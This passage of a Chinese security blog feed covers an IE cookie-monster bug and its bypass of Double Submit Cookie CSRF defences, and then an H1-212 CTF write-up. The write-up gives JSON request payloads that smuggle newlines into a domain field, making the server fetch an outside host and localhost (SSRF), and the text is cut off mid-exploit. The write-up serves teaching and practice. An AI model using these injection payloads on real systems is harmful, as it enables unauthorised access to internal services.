&lt;b&gt;02.10.2017&lt;/b&gt; – &quot;得到回应&quot;, &lt;/p&gt;&lt;p&gt;·  &lt;b&gt;10.10.2017&lt;/b&gt; – 得到动态导入函数绕过的奖励 &lt;/p&gt;&lt;p&gt;·  &lt;b&gt;19.11.2017&lt;/b&gt; – 询问谷歌什么时候漏洞修复 &lt;/p&gt;&lt;p&gt;·  &lt;b&gt;27.11.2017&lt;/b&gt; –谷歌回应说，这些错误已经被修复，但没有被部署。 &lt;/p&gt;&lt;p&gt;·  &lt;b&gt;30.11.2017&lt;/b&gt; – 博客发表 &lt;/p&gt;&lt;p&gt;更多详细信息请参考：&lt;a href=&quot;http://blog.bentkowski.info/2017/11/yet-another-google-caja-bypasses-hat.html&quot;&gt;http://blog.bentkowski.info/2017/11/yet-another-google-caja-bypasses-hat.html&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-12-10-31875007</guid>
<pubDate>Sun, 10 Dec 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>IE cookie monster bug fixed on windows 10</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-12-05-31715835.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;IE cookie monster bug fixed on windows 10&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31715835&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;b&gt;总览&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;IE cookie monster bug 已在 Win10 中修复，然而它还没有在 Win7 和 8.1中修复。因此，区域性域名(比如 JP 顶级域名)的 Cookie 有可能被第三方修改。因此，我们应该慎重考虑该漏洞带来的影响。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Cookies 被第三方修改所带来的风险&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当一个用户的 Cookie 被第三方改写时，其可能会有如下风险：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;会话固定攻击&lt;/li&gt;&lt;li&gt;某些 CSRF 防御的绕过&lt;/li&gt;&lt;li&gt;基于 Cookie 的 XSS&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;其中的&quot;某些 CSRF 防御&quot;特指 &lt;a href=&quot;http://link.zhihu.com/?target=https%3A//www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet%23Double_Submit_Cookie&quot;&gt;Double Cookie Submit&lt;/a&gt;。（双 Cookie 递交认证，指的是在GET 参数及 HTTP 请求中同时包含一个随机的字符串，如果服务器判断 GET 参数和 Cookie参数相等，那么没有受到 CSRF 攻击）由于这是 OWASP 钦定的防御方法，人们往往会忽略 IE Cookie 漏洞对其的绕过。以下框架中，IE 的 Cookie 漏洞都会带来 CSRF 绕过:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Fuel PHP&lt;/li&gt;&lt;li&gt;Codelgniter&lt;/li&gt;&lt;li&gt;Django&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;当然，受影响的远不止这些。&lt;/p&gt;&lt;p&gt;由于 Double Submit Cookie 并不需要维持状态，这种方法在 REST 中越来越常见。&lt;/p&gt;&lt;p&gt;我们公司的安全审计都会指出 Double Submit Cookie 的缺陷，其具体危害视被改变的信息而定。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;第三方如何改变Cookie&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;有许许多多的方式可以从外部改变 Cookie ,不过主要的还是：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Cookie Monster Bug&lt;/li&gt;&lt;li&gt;存在 XSS&lt;/li&gt;&lt;li&gt;HTTP 头注入&lt;/li&gt;&lt;li&gt;子域名中存在 XSS&lt;/li&gt;&lt;li&gt;站点使用 HTTPS（参考：&lt;a href=&quot;https://blog.tokumaru.org/2013/09/cookie-manipulation-is-possible-even-on-ssl.html&quot;&gt;https://blog.tokumaru.org/2013/09/cookie-manipulation-is-possible-even-on-ssl.html&lt;/a&gt;）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在这其中，如果漏洞可以修复就好了 “在应用程序中没有漏洞，但是 cookie 却被重写了。” 这就是使用了 cookie monster bug 和 https 的情况。后者以前做了详细的说明，所以在本篇文章中，提到了 cookie monster bug。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是Cookie Monster漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们拿东京的一个网站类比吧。东京地铁管理局使用 JP 域下的区域域名 &lt;a href=&quot;http://link.zhihu.com/?target=https%3A//onenote.officeapps.live.com/o/www.metro.tokyo.jp%25E3%2580%2582&quot;&gt;www.metro.tokyo.jp。&lt;/a&gt;如果我们用 &lt;a href=&quot;http://link.zhihu.com/?target=http%3A//example.tokyo.jp/&quot;&gt;example.tokyo.jp&lt;/a&gt; 设置 Cookie，那么东京地铁局的 Cookie 也会被改变。 虽然这违反了 SOP，但出于种种原因，IE 认同这种行为。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;认证Win10的Cookie　Monster&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;最近,我思考 IE 的 cookie monster bug是否有效。于是我检查了该 bug 是否能存在于Win8.1 和 Win10 的最新版本中，在 Windows 10 中, Edge &lt;a href=&quot;http://%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8kawaguchi.tokyo.jp&quot;&gt;我们使用kawaguchi.tokyo.jp&lt;/a&gt; 和 tokumaru.bunkyo.tokyo.jp 作为我们的测试域名。结果如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3e850bba8cef9a63a8be32d1e697b049_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;664&quot; data-rawheight=&quot;150&quot;&gt;&lt;p&gt;因此，微软最终在 Win10(IE + Edge) 里修复了这个 bug。我们不知道准确的修复时间,但是由于我们已经确认它已经从 Windows 10 的初始版本中消除。我们预计在 Windows 10 发行的时候已经解决了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Cookie Monster还会持续多久?&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;然而，微软并没有修复 WIn7 和 Win8.1 的 Cookie Monster。因此，微软很可能不会选择修复了。因此，在 2023 年之前（Win8.1 停止维护时间），我们都要警惕它。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;如何防御&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;只要你对会话实现了正常的更新机制，会话固定攻击就不会被 Cookie Monster 进一步利用&lt;/p&gt;&lt;p&gt;不要用 Double Cookie Submit 防御 CSRF。特别是那些基于子域名的网站。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;即使没有 Cookie Monster bug，如果通信路由上有攻击者，也可以通过中间人攻击在 HTTP端修改 cookie。我一直在用 Double Submit Cookie 来解决 CSRF 措施（虽然风险很大），因为我考虑了这个攻击手段。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我汇报了该 bug 的当前状态。我们仍然需要考虑最近五年内它会带来的风险直到 Windows 8.1 的支持结束。因此，受到该类漏洞影响的网站有必要停用 Double Cookie Submit 机制。&lt;/p&gt;&lt;p&gt;原文：&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//blog.tokumaru.org/2017/11/ie-cookie-monster-bug-fixed-on-windows-10.html&quot;&gt;IEのクッキーモンスターバグはWindows 10で解消されていた&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-12-05-31715835</guid>
<pubDate>Tue, 05 Dec 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Twosecurity 新一轮招生来啦~~（文末有福利哦）</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-11-30-31546921.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Twosecurity 新一轮招生来啦~~（文末有福利哦）&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31546921&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;b&gt;各位学员们大家好！为了满足广大学员的需要，Twosecurity现在新增加两种课程。&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;入门课程:&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;培训周期：四周&lt;/p&gt;&lt;p&gt;培训费用：¥5000&lt;/p&gt;&lt;p&gt;培训目标：从零开始，掌握 web 安全的基础，挖掘到你的第一个漏洞。&lt;/p&gt;&lt;p&gt;适合人群：web安全较薄弱，但是又对web安全充满学习的热情与渴望&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;进阶课程:&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;培训周期：八周&lt;/p&gt;&lt;p&gt;培训费用：¥10000&lt;/p&gt;&lt;p&gt;培训目标：学习高级的安全技能，掌握一套方法论和理念，支撑个人成长发展。&lt;/p&gt;&lt;p&gt;适合人群：掌握一定的web安全基础，但是对漏洞原理不是特别熟悉，&quot;依赖&quot;工具的脚本小子&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们采用创新式线上培训模式，交互式学习平台，自由分配的学习时间，针对课程问题的任意答疑，助您及时发现问题并及时提升自我。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;注：今年报名 在校学生与v2ex用户即可享有&lt;b&gt;6.6折年末优惠&lt;/b&gt;哦&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;详情可咨询微信：twosecurityrefer&lt;br&gt;&lt;/p&gt;&lt;p&gt;欢迎骚扰哦 ^_^&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-11-30-31546921</guid>
<pubDate>Thu, 30 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>H1-212 CTF writeup</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-11-25-31386355.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;H1-212 CTF writeup&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31386355&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5b18cdd62aeead010f1748e71463bf10_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;题目介绍&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;acme.org 的工程师在 https://104.236.20.43/ 上推出了新管理面板的新服务器。他坚信他的服务器不会被黑客攻击。他在里面设置了一个“机关”，一旦 flag 文件被读取他就会知道。他也提到 apache 的默认页面也在那儿，不过是他有意为之并无什么特殊意义。你的目标是什么呢？得到 flag !&lt;/p&gt;&lt;p&gt;Time to hack!&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e591ed7a8f94dfb1a2de49bc7048491b_r.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;320&quot; data-rawheight=&quot;240&quot; data-thumbnail=&quot;https://pic4.zhimg.com/v2-e591ed7a8f94dfb1a2de49bc7048491b_b.jpg&quot;&gt;&lt;h2&gt;&lt;b&gt;目标侦查 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在真正攻击之前，我首先是尽可能多的收集关于目标的信息。这些步骤包括对主机运行一些简单的命令，像 host 、 dig 、nslookup 等。然后，我在 shodan 上搜索了 Ip，使用了一些 google 搜索语法，尝试了 DNS 反向域名查找，构成了我信息收集的过程。不出所料，果然开放了 22 和 80 端口。而此时我正在进行被动侦查阶段，并记录下我的发现。&lt;/p&gt;&lt;p&gt;现在是时候与主机直接交互了。我在 nmap 上展开了完整的 TCP 扫描以确定是否有其他端口开放，结果证明只开放了 22 和 80 端口。在扫描过程中，我浏览了这个网站，发现了有名的 apache 默认页面，但是正如 acme.org 的工程师提到的，这是故意的并无其它含义。另外，主机还泄露了 web 服务器的版本：apache v2.4.18，并且运行在 Ubuntu 的发行版本上。为了最精彩的部分，我仔细阅读了 apache 默认页面，企图找到蛛丝马迹，但都无济于事。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;打破常规 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;为了这个得到 flag，我打算穷尽自己储备的知识并进行不懈的尝试！如果你不敢打破常规、大胆尝试，那你还算是个黑客吗？&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-35950b06117f82535ef577f0d80cc9f0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;533&quot;&gt;&lt;p&gt;&lt;a href=&quot;https://twitter.com/jobertabma/status/930273559946989569&quot;&gt;Jobert 的话&lt;/a&gt; 引起了我的注意：CTF 中爆破服务器并不是解决问题的关键。&lt;/p&gt;&lt;blockquote&gt;大约12小时前，我们推出了一场CTF，为了赢得H1-212（NYC）12月份的入场券，与全球顶尖的黑客切磋。从那时起，34,921,283个请求发送到服务器。但只有两个人解决了这个问题。&lt;b&gt;也许暴力破解不是解决问题的关键&lt;/b&gt;。&lt;/blockquote&gt;&lt;p&gt;虽然不抱任何希望，我还是决定使用 burpsuite 的 intruder 模块跑几个字典试试。其中一个字典是我用 ceWL 自定义生成的。CTF 中我大多数情况见到是文件和目录名都被隐藏在主页里面。&lt;/p&gt;&lt;p&gt;在发送了几千个 HTTP 请求之后，唯一发现的是 /flag 这个目录。在看到文件内容之前我猜想，不出意外里面可能是：&lt;/p&gt;&lt;blockquote&gt;真的认为有这么简单吗？继续挖掘吧！&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;改变战略&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;疯狂就是一遍又一遍地做同样的事情，却期待着不同的结果。&lt;/blockquote&gt;&lt;p&gt;此刻，我感觉自己什么也做不了。运行自动化工具可能也不会有任何发现。以我过去 CTF 的经验来看，题目的描述内容或许隐藏着线索。当我重读题目后发现了这么几个问题:&lt;/p&gt;&lt;p&gt;1. 为什么要提到 acme.org ？&lt;/p&gt;&lt;p&gt;2. 这和真实的域名 acme.org 有何联系？&lt;/p&gt;&lt;p&gt;3. 难道服务器是运行在指向 acme.org 的虚拟主机上？&lt;/p&gt;&lt;p&gt;4. 为什么他们要提到一个 admin panel ？&lt;/p&gt;&lt;p&gt;5. 这儿有个叫 admin.acme.org 的虚拟主机？&lt;/p&gt;&lt;p&gt;现在是时候揭晓答案了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;虚拟主机发现&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这里我打算编写一个快速的脚本来枚举虚拟主机，但当我想起了Jobert的&lt;a href=&quot;https://github.com/jobertabma/virtual-host-discovery&quot;&gt;虚拟主机扫描&lt;/a&gt;工具，我又确保添加了 104.236.20.43 到 /etc/hosts 中，关键字 admin 就在这款工具的字典列表里并且可以触发它。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8d3e30043cba9e16c554ab065e7e7b9a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;876&quot; data-rawheight=&quot;70&quot;&gt;&lt;h2&gt;&lt;b&gt;Admin panel&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;正如所料，虚拟主机的发现结果变得有意思了，虚拟主机 admin.acme.org 存在并且分配给你一个奇怪的 cookie: admin=no 。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-482deb6775ef62872b7f57b7628f8bcf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;628&quot; data-rawheight=&quot;331&quot;&gt;&lt;p&gt;正如每个人都会做的一样，我把请求发送到了 repeater ，将 admin=no 改为 admin=yes 。我知道不会这么简单，但是服务器返回了一个 405 Method Not Allowed 。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ff3a99309b78355e80301f57aaf368e5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;584&quot; data-rawheight=&quot;210&quot;&gt;&lt;p&gt;显然，服务器并不支持我的 HTTP GET 请求，那为什么不用一个空的 body 来发送一个 POST 请求呢？此刻，事情就变得有趣了。服务器响应了一个 406 Not Acceptable 错误。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ed734611c54a75e80866b35aa24d7e7e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1262&quot; data-rawheight=&quot;273&quot;&gt;&lt;p&gt;将 cookie 从 admin=yes 转换回 admin=no ，并发送同样的 POST 请求会得到一个 200 OK 的响应。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c1d94a40954191d601324218d040fca3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1262&quot; data-rawheight=&quot;268&quot;&gt;&lt;p&gt;奇怪的行为。经过一番在线搜索后我发现了 406 Not Acceptable:&lt;/p&gt;&lt;blockquote&gt;根据请求中接收到的主动协商报头字段，目标资源不具有用户代理可接受的当前表示，并且服务器不愿意提供默认表示。&lt;br&gt;来源：&lt;a href=&quot;https://httpstatuses.com/406&quot;&gt;httpstatuses&lt;/a&gt; &lt;/blockquote&gt;&lt;p&gt;我打算用大量不同的值通过 intruder 来 fuzz User-Agent 和 Accept 请求头，但是响应包的大小并没有改变。尽管我也向 &lt;a href=&quot;https://admin.acme.org/&quot;&gt;https://admin.acme.org/&lt;/a&gt; 发送 POST 请求，然而并没有发现其路径下的任何文件。 emmmmm，PHP 可以运行吗？&lt;/p&gt;&lt;p&gt;就是 PHP ！我向 /index.php 发送了 HTTP 请求。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-93d2770951b030135d7615965b5ffdb0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1264&quot; data-rawheight=&quot;271&quot;&gt;&lt;h2&gt;&lt;b&gt;缺失的请求头&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6d89c1171cdfad78fe2517a0224f8c57_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1262&quot; data-rawheight=&quot;294&quot;&gt;&lt;p&gt;看到来自服务器的 418 I’m a teapot 响应了吗？太奇怪了，我花了数个小时来弄懂它的意图，并向&lt;br&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc2324&quot;&gt;HTCPCP &lt;/a&gt;发送了几种不同的请求。我决定将关注点放在原始的 POST 请求上并仔细分析。&lt;/p&gt;&lt;p&gt;看着这个请求头，我认为这儿好像有什么东西缺失了。实际上，这里是缺了 Content-Type 头。尝试了 application/xml、application/php、text/plain 和 text/html 这几种 MIME 类型之后，我得到了一个 application.json 类型的响应。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;error&quot;:{&quot;body&quot;:&quot;unable to decode&quot;}}&lt;/code&gt;&lt;p&gt;上面的错误表明应用需要一个 json 格式的 body ，发送 body 内容为{}的请求，得到如下的结果&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;error&quot;:{&quot;domain&quot;:&quot;required&quot;}} 。&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-df3cea886423c5f7da9f0d9f9aeb1ce4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1265&quot; data-rawheight=&quot;334&quot;&gt;&lt;p&gt;看来需要一个 domain参数，将 body 从 {} 改为 {&quot;domain&quot;:&quot;test123&quot;}，这次产生了不同的错误：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;error&quot;:{&quot;domain&quot;:&quot;incorrect value, .com domain expected&quot;}}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6ebb731104e969c34c64d285c7c14925_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1263&quot; data-rawheight=&quot;341&quot;&gt;&lt;p&gt;期望一个 “.com” 形式的域名。改为 test.com 产生同样的错误。尝试了不同的组合之后发现 &lt;a href=&quot;http://www.test123.com/&quot;&gt;www.test123.com&lt;/a&gt; 得到了不同的响应：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;error&quot;:{&quot;domain&quot;:&quot;incorrect value, sub domain should contain 212&quot;}}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3ee54c5ca5f3da72a816087d8d4ce1d6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1294&quot; data-rawheight=&quot;335&quot;&gt;&lt;h2&gt;&lt;b&gt;神秘的数字&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;所以，子域名必须要包含数字 212 。最后尝试 212.test123.com 终于得到了有用响应：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;next&quot;:&quot;\/read.php?id=0&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-92e5787950556dcf8edb872bcfee3b06_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1261&quot; data-rawheight=&quot;338&quot;&gt;&lt;p&gt;向 /read.php?id=0 发送 GET 请求，返回：{&quot;data&quot;:&quot;}&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8b6bb1f34fd3e0d5859b5fc061e0f257_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1262&quot; data-rawheight=&quot;275&quot;&gt;&lt;p&gt;将 id 增加 1 ，得到相同的结果：{&quot;data&quot;:&quot;}，当id 大于等于2时，得到如下的错误：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;error&quot;:{&quot;row&quot;:&quot;incorrect row&quot;}}&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-00a9f9287cc383b4cfe25545e634cbaf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1264&quot; data-rawheight=&quot;271&quot;&gt;&lt;p&gt;向 index.php 发送更多的请求 id 值就会依次加 1 。&lt;/p&gt;&lt;p&gt;接下来的思路是 SSRF 。怎样确定服务器会验证我提供的域名呢？出于好奇，我打算用真实存在的域名来测试。&lt;/p&gt;&lt;p&gt;我使用简单的 google 语法 ：site:212.*.com 找到了 212.huelectricbike.com 这个域名。&lt;/p&gt;&lt;p&gt;这次我用新找到的域名：212.huelectricbike.com 向 /index.php 发送 POST 请求。&lt;/p&gt;&lt;p&gt;令我大吃一惊的是：使用新生成的 id 回到 /read.php 页面，竟然出现了一大串 base64 加密的数据。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{&quot;data&quot;:&quot;PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIKICAgICAgICAiaHR...&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b2c92c288d96b9f9e5acd341baf7fe3b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1293&quot; data-rawheight=&quot;377&quot;&gt;&lt;p&gt;解码发现这些数据正是 212.huelectricbike.com 主页的源代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;base64 -d &amp;lt;&amp;lt;&amp;lt; PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIKICAgICAgICAiaHR...&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-66da5b17c1a656c00341416bda88d5fc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1223&quot; data-rawheight=&quot;252&quot;&gt;&lt;h2&gt;&lt;b&gt;深入挖掘&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;目前为止，我所得到信息有：&lt;/p&gt;&lt;p&gt;1. 212.*.com 站点对应用程序是有用的；&lt;/p&gt;&lt;p&gt;2. 该应用返回了网站的源码 ；&lt;/p&gt;&lt;p&gt;3. 应用对源码采用了 base64 加密；&lt;/p&gt;&lt;p&gt;4. 应用程序使用会随着每次请求而递增的 id 将加密后的数据存储在一种特殊的文件或数据库中；&lt;/p&gt;&lt;p&gt;5. 向 /index.php?id=ID_HERE 发送 GET 请求是有机会看到加密值的；&lt;/p&gt;&lt;p&gt;6. Id 似乎是为特定 用户生成的，意味着我不能查看别的用后存储的数据，这通过使用不同的 ip 测试得出的；&lt;/p&gt;&lt;p&gt;7. 应用程序似乎有某种正则机制来过滤一些模式和字符。&lt;/p&gt;&lt;p&gt;现在是时候来绕过这些过滤了，在测试了 \ / = - @ . % { } [ ] 这几个字符后，我发现 % 会在域名中被过滤掉：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request body:
{&quot;domain&quot;:&quot;212.huelectricbike%.com.com&quot;}
Response:
{&quot;error&quot;:{&quot;domain&quot;:&quot;domain cannot contain %&quot;}} &lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-38ff680810eefb936ed5ce8e3cb6f8ed_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1264&quot; data-rawheight=&quot;346&quot;&gt;&lt;p&gt;尝试了几种不同的绕过之后，我考虑到了未编码的 CRLF 注入，因为应用只是过滤了 % 而没有过滤 \ 。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Let&#39;s Play Fetch&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果我能用 CRLF 注入绕过过滤并强制应用程序从&lt;a href=&quot;https://0xc0ffee.io/&quot;&gt;我自己的域&lt;/a&gt;返回数据，那会怎么样呢？如果我能成功绕过过滤，我就可以向本地主机发送请求从而得到更多的信息。&lt;/p&gt;&lt;p&gt;在使用我自己的域之前，如果对这个站点进行 CRLF 注入会怎样呢？&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request Body:
{&quot;domain&quot;:&quot;\r\n212.huelectricbike.com&quot;} 
Response:
{&quot;next&quot;:&quot;\/read.php?id=9&quot;} &lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4ae52cde4e0b5d366ccd0d45af1c2aa0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1264&quot; data-rawheight=&quot;340&quot;&gt;&lt;p&gt;Id 从7 到 9 递增了2！我太激动了！这说明发送了2个请求而不是一个。接下来是绕过域名里必需神秘数字 212 。&lt;/p&gt;&lt;p&gt;经过多次失败的尝试，我发现可以绕过程序限定的 212 和.com ,并且意识到其实不需要回车符：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request body:
{&quot;domain&quot;:&quot;212\n0xc0ffee.io\n.com&quot;} 
Response:
{&quot;next&quot;:&quot;\/read.php?id=15&quot;} &lt;/code&gt;&lt;p&gt;漂亮的 GET 请求从目标主机发送到了我自己的服务器上：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-141b99b4407472737b4323677e6b97d2_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;639&quot; data-rawheight=&quot;37&quot;&gt;&lt;p&gt;并且真的返回了主页的源码。这次 id 递增了3，因为应用程序接受了三个请求（212，0xc0ffee.io，.com），显然这次的请求更加吸引我。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-68faca0ae020742fc32034e22f4e9627_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1299&quot; data-rawheight=&quot;562&quot;&gt;&lt;p&gt;实际发生了什么：&lt;/p&gt;&lt;p&gt;1. 212 被程序执行了，也就是换行符被解析执行了；&lt;/p&gt;&lt;p&gt;2. 0xc0ffee.io&lt;br&gt;也被程序执行了，换行符被执行了；&lt;/p&gt;&lt;p&gt;3. .com 也被执行了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;躲猫猫&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;好了，那么 flag 藏在哪儿了呢？正如之前说过的，如果可以绕过过滤那么就能获得来自本地主机的数据。&lt;/p&gt;&lt;p&gt;发送如下的请求不会得到有用的响应：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request body: {&quot;domain&quot;:&quot;212\nlocalhost\n.com&quot;}
Response:
{&quot;error&quot;:{&quot;domain&quot;:&quot;incorrect value, .com domain
expected&quot;}} &lt;/code&gt;&lt;p&gt;然而，过会儿我发现，我所需要的只是在 localhost 旁加一个点：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Request body:
{&quot;domain&quot;:&quot;212\nlocalhost.\n.com&quot;} 
Response:
